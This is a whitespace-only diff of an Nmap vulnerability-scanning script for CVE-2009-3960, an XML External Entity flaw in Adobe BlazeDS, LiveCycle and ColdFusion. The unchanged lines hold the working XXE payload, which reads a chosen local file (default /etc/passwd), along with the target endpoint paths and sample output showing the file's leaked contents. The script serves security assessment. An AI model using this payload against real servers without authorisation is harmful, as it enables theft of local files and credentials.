@@ -9,8 +9,8 @@ description = [[
 Exploits cve-2009-3960 also known as Adobe XML External Entity Injection.
 
 This vulnerability permits to read local files remotely and is present in
-BlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0,  LiveCycle Data 
-Services 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and 
+BlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0,  LiveCycle Data
+Services 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and
 ColdFusion 7.0.2, 8.0, 8.0.1, and 9.0
 
 For more information see:
@@ -29,7 +29,7 @@ For more information see:
 --@output
 -- PORT   STATE SERVICE
 -- 80/tcp open  http
---| http-vuln-cve2009-3960: 
+--| http-vuln-cve2009-3960:
 --|     samples/messagebroker/http
 --|     <?xml version="1.0" encoding="utf-8"?>
 --|     <amfx ver="3"><body targetURI="/onResult" responseURI=""><object type="flex.messaging.messages.AcknowledgeMessage"><traits><string>timestamp</string><string>headers</string><string>body</string><string>correlationId</string><string>messageId</string><string>timeToLive</string><string>clientId</string><string>destination</string></traits><double>1.325337665684E12</double><object><traits><string>DSMessagingVersion</string><string>DSId</string></traits><double>1.0</double><string>5E037B49-540B-EDCF-A83A-BE9059CF6812</string></object><null/><string>root:x:0:0:root:/root:/bin/bash
@@ -68,7 +68,7 @@ action = function(host, port)
   local matchend = '</string><null/></object></body></amfx>'
   local matchsize = 120
   local matchnotvuln = '<string>External entities are not allowed</string>'
-  
+
   local results = {}
   local root = stdnse.get_script_args(SCRIPT_NAME .. ".root") or "/"
   local readfile = stdnse.get_script_args(SCRIPT_NAME .. ".readfile") or "/etc/passwd"
@@ -77,26 +77,26 @@ action = function(host, port)
     "messagebroker/http",
     "messagebroker/httpsecure",
 
-    -- Coldfusion  
-    "flex2gateway/http",  
+    -- Coldfusion
+    "flex2gateway/http",
     "flex2gateway/httpsecure",
-                 
+
     -- BlazeDS
-    "blazeds/messagebroker/http", 
+    "blazeds/messagebroker/http",
     "blazeds/messagebroker/httpsecure",
     "samples/messagebroker/http",
     "samples/messagebroker/httpsecure",
-                  
+
     -- LiveCycle Data Services
-    "lcds/messagebroker/http", 
-    "lcds/messagebroker/httpsecure", 
-    "lcds-samples/messagebroker/http", 
-    "lcds-samples/messagebroker/httpsecure", 
+    "lcds/messagebroker/http",
+    "lcds/messagebroker/httpsecure",
+    "lcds-samples/messagebroker/http",
+    "lcds-samples/messagebroker/httpsecure",
   }
 
-  local exploit = [[<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test 
+  local exploit = [[<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test
     [ <!ENTITY x3 SYSTEM "]].. readfile
-    .. [["> ]><amfx ver="3" 
+    .. [["> ]><amfx ver="3"
     xmlns="http://www.macromedia.com/2005/amfx"><body>
     <object type="flex.messaging.messages.CommandMessage">
     <traits><string>body</string><string>clientId</string>
@@ -122,8 +122,8 @@ action = function(host, port)
     },
     description = [[
 Permits to read local files remotely and is present in
-BlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0,  LiveCycle Data 
-Services 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and 
+BlazeDS 3.2 and earlier, LiveCycle 8.0.1, 8.2.1, and 9.0,  LiveCycle Data
+Services 2.5.1, 2.6.1, and 3.0, Flex Data Services 2.0.1, and
 ColdFusion 7.0.2, 8.0, 8.0.1, and 9.0]],
     references = {
       'http://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf',
@@ -134,16 +134,16 @@ ColdFusion 7.0.2, 8.0, 8.0.1, and 9.0]],
     },
     exploit_results = {},
   }
-  
+
   local report = vulns.Report:new(SCRIPT_NAME, host, port)
   http_vuln.state = vulns.STATE.NOT_VULN
 
   for _,path in pairs(paths) do
     local uri = root .. path
     local response = http.post(host, port, uri, options, nil, exploit)
-  
-    if response.status == 200 then   
-      if #response.body >= matchsize and 
+
+    if response.status == 200 then
+      if #response.body >= matchsize and
         string.sub(response.body,1,string.len(matchstart))==matchstart and
         string.sub(response.body,-string.len(matchend))==matchend and
         string.match(response.body, matchnotvuln)==nil
